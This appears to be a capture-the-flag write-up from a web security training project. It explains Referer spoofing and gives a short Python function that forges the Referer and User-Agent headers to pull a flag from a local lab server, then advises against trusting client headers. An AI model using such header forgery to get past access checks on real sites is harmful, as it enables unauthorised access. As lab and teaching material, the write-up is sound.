# Referer spoofing

### Introduction
Referer spoofing involves modifying the Referer header of an HTTP request to deceive the server into thinking the request originates from a trusted source.

### Procedure
Upon inspecting the page's source code, the suggestion is to modify the Referer header of the request to ``https://www.nsa.gov/`` and the browser's User-Agent to ``ft_bornToSec``. Consequently, we need to send a GET request to the server with these adjusted headers.

### Program
We created a program designed to dispatch a GET request to the server, but with altered ``Referer`` and ``User-Agent`` headers. The function will subsequently return the response of the request, which should contain the flag we are looking for.
``` python
def try_referer_spoofing():
	encoded_params = urllib.parse.urlencode({ 'page': 'b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' })

	url = 'http://192.168.56.2/?{}'.format(encoded_params)

	headers = {
		'Referer': "https://www.nsa.gov/",
		'User-Agent': "ft_bornToSec"
	}

	response = requests.get(url, headers=headers)

	return response.text
```

### How to fix
It is crucial for the security of a service not to rely solely on these insecure headers. The server should never trust the information sent by clients. Therefore, it is advisable to implement an alternative security system rather than depending solely on the Referer header.